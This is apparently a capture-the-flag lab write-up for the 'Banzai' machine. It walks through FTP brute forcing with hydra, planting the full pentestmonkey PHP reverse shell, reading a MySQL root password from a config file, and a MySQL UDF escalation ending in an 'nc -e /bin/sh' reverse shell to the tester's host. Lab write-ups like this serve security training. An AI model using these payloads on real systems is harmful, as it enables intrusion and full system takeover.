---
layout: default
title: x004-Born2Root
nav_order: 2
has_children: true
parent: writeups
grand_parent: DylanGrl Writings
---

## x004-Banzai

### Abstract
Linux machine exposing an FTP access with weak credential / default password, this server contains files from the web application running on another port. 
This web application use PHP so it has been used to gain initial reverse shell before escalating it to a root one using user defined function to escalate to root from MySQL DB service running as root.

### Service enumeration : 

| Server IP Adress | Ports Open |
|------------------|------------|
| 192.168.194.56   | TCP : 21, 22, 25, 5432, 8080, 8295     |
|                  | UDP :      |

#### NMAP
Using  :
```sh
nmap -Pn -n -p- --min-rate 4000 --open -sCV 192.168.194.56
```

Result : 
```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open  smtp       Postfix smtpd
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
5432/tcp open  postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
8295/tcp open  http       Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Banzai
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Global information gathering : 
##### FTP Server - Port 21
No exploit was found on this service. Access get brute force and provide us the content of the second web server. This is our way inside the web server.

##### SSH Server - Port 22
No access possible and no exploit was found on this service.

##### SMTP - Port 25 
Nothing useful from there, only the function VRFY allowing us to assert the presence of user inside the system.

##### PostgreSQL DB - Port 5432
Despite being exposed, it wasn't possible to access the database even with set of default credential. No exploit was found on this service. 

##### Web server - Port 8080

The first web server running on port 8080 could not be reach even with dirbuster and 403 bypass. No exploit. 

##### Web server - Port 8295
The second one is a bootstrap instance, only form available is the contact one but it is not working. 
Using dirbuster we find some of the folder available publicly but it didn't provide any useful information. No exploit. 

##### MySQL DB - Internal
There is a MySQL DB server running with access allowed only for localhost (detected once access was made). 

### Intrusion 
Using hydra and trying to bruteforce the admin user we manage to find the password for the FTP : 

```sh
hydra -l admin -P /usr/share/wordlists/wfuzz/general/common.txt ftp://192.168.194.56  
```

![](attachments/Pasted%20image%2020220302164736.png)

Putting the ftp client in passive mode, we are able to list the content of the folder : 
![](attachments/Pasted%20image%2020220302165005.png)

The content looks like the one from the Bootstrap website we notice on port 8295.

We could confirm it by retrieving and updating the index.php file : 
```html
<header id="header">
    <h1> HACKED </h1>
    <div class="container">
```

![](attachments/Pasted%20image%2020220302170555.png)

PHP is also executed properly : 
```php
<header id="header">
    <?php
      echo "Hello world!";
      ?>
    <div class="container">
```
![](attachments/Pasted%20image%2020220302171405.png)

From there we could build our payload to reach the reverse shell.

We will use the pentest monkey php reverse shell (build with : https://www.revshells.com/) and here we are : 
![](attachments/Pasted%20image%2020220302173724.png)

Note : Some struggle with the port, we use 8080 are another server is running with this port on the machine so it has been supposed that the traffic on this port is allowed.

##### Payload : 

```php
<?php
    // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '192.168.49.194';
    $port = 8080;
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;

    if (function_exists('pcntl_fork')) {
    	$pid = pcntl_fork();

    	if ($pid == -1) {
    		printit("ERROR: Can't fork");
    		exit(1);
    	}

    	if ($pid) {
    		exit(0);  // Parent exits
    	}
    	if (posix_setsid() == -1) {
    		printit("Error: Can't setsid()");
    		exit(1);
    	}

    	$daemon = 1;
    } else {
    	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }

    chdir("/");

    umask(0);

    // Open reverse connection
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
    	printit("$errstr ($errno)");
    	exit(1);
    }

    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
    	printit("ERROR: Can't spawn shell");
    	exit(1);
    }

    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit("Successfully opened reverse shell to $ip:$port");

    while (1) {
    	if (feof($sock)) {
    		printit("ERROR: Shell connection terminated");
    		break;
    	}

    	if (feof($pipes[1])) {
    		printit("ERROR: Shell process terminated");
    		break;
    	}

    	$read_a = array($sock, $pipes[1], $pipes[2]);
    	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    	if (in_array($sock, $read_a)) {
    		if ($debug) printit("SOCK READ");
    		$input = fread($sock, $chunk_size);
    		if ($debug) printit("SOCK: $input");
    		fwrite($pipes[0], $input);
    	}

    	if (in_array($pipes[1], $read_a)) {
    		if ($debug) printit("STDOUT READ");
    		$input = fread($pipes[1], $chunk_size);
    		if ($debug) printit("STDOUT: $input");
    		fwrite($sock, $input);
    	}

    	if (in_array($pipes[2], $read_a)) {
    		if ($debug) printit("STDERR READ");
    		$input = fread($pipes[2], $chunk_size);
    		if ($debug) printit("STDERR: $input");
    		fwrite($sock, $input);
    	}
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    function printit ($string) {
    	if (!$daemon) {
    		print "$string\n";
    	}
    }

    ?>

```

### Privilege Escalation 

#### Vulnerability exploited : 

MySQL root password stored inside config file.

User defined function to escalate to root from MySQL DB service running as root.

#### Exploit explanation :

In order to reach the privilege escalation, we are making usage of root credential from the MySQL exposed inside a configuration file. 
The server is running under the root account which make it even more critical to be vulnerable. 

With those information and some research we were able to find a definition and a PoC allowing the escalation from mysql root user to the system  one :  https://www.tenable.com/plugins/nessus/17698 / https://gist.github.com/p0c/8587757 


#### Remediation :  
Run the MySQL service with a dedicated user and also create a dedicated account inside MySQL for your application instead of using the root one.

#### Proof of Concept / Steps to reproduce : 

Retrieve the DB credential from the configuration file inside the web server folder : 
```sh
cd /var/www
---

ls
---
config.php  html

cat config.php
---
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>
```

We cannot use `mysql` has the shell isn't interactive but we can upgrade it with the following command : 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

We could confirm that we have access to the MySQL DB : 
![](attachments/Pasted%20image%2020220302222543.png)

In order to proceed to the exploit we will use the following payload : https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql 

In particular : https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/mysql/lib_mysqludf_sys_64.so 

We could load this file using out ftp access, it will then be located under : `/var/www/html/`

We could then proceed to the exploit with our existing connection to the DB :

```bash
mysql> use mysql;

mysql> create table hack(line blob);

mysql> insert into hack values(load_file('/var/www/html/lib_mysqludf_sys_64.so '));

mysql> select * from hack into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';

# Launch this last step with a nc connection waiting on port 22 :
mysql> select sys_exec('nc -e /bin/sh 192.168.49.194 22');
```

And we have access on our root reverse shell :
![](attachments/Pasted%20image%2020220302223251.png)